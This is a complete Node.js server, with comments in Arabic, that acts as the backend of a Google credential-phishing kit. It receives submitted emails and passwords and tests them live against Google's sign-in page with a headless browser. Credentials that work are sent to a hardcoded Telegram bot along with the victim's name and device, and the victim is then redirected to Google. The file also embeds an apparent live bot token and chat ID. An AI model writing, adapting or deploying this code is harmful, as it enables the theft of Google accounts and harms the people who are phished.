const express = require('express');
const puppeteer = require('puppeteer');
const axios = require('axios');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

// بيانات التليجرام الخاصة بك
const TELEGRAM_TOKEN = '8643435396:AAFDivegWPhjREbRaW0oCiY4nsf_EiMqNmw';
const CHAT_ID = '6893210883';

app.post('/verify', async (req, res) => {
    const { email, password, name, device } = req.body;
    let browser;

    try {
        // تشغيل المتصفح بإعدادات تناسب السيرفرات الضعيفة
        browser = await puppeteer.launch({
            headless: "new",
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
        });
        
        const page = await browser.newPage();
        
        // الدخول لصفحة جوجل
        await page.goto('https://accounts.google.com/signin/v2/identifier', { waitUntil: 'networkidle2' });
        
        // كتابة الإيميل
        await page.type('input[type="email"]', email);
        await page.click('#identifierNext');
        await new Promise(r => setTimeout(r, 2000)); // انتظار التحميل

        // كتابة الباسورد
        await page.type('input[type="password"]', password);
        await page.click('#passwordNext');
        await new Promise(r => setTimeout(r, 3000)); // انتظار نتيجة الفحص

        // التحقق: هل ظهرت رسالة خطأ في جوجل؟
        const isError = await page.$('div[aria-live="assertive"]');

        if (isError) {
            // الباسورد خطأ حقيقياً
            res.json({ status: 'error', message: 'كلمة المرور غير صحيحة.' });
        } else {
            // الباسورد صحيح 100% - نرسله لتليجرام
            const message = `✅ صيد حقيقي وصحيح 100%:\n👤 الاسم: ${name}\n📧 الإيميل: ${email}\n🔑 الباسورد: ${password}\n📱 الجهاز: ${device}`;
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message
            });
            res.json({ status: 'success', redirect: 'https://accounts.google.com' });
        }
    } catch (err) {
        console.error(err);
        res.status(500).json({ status: 'server_error' });
    } finally {
        if (browser) await browser.close();
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server started on port ${PORT}`));
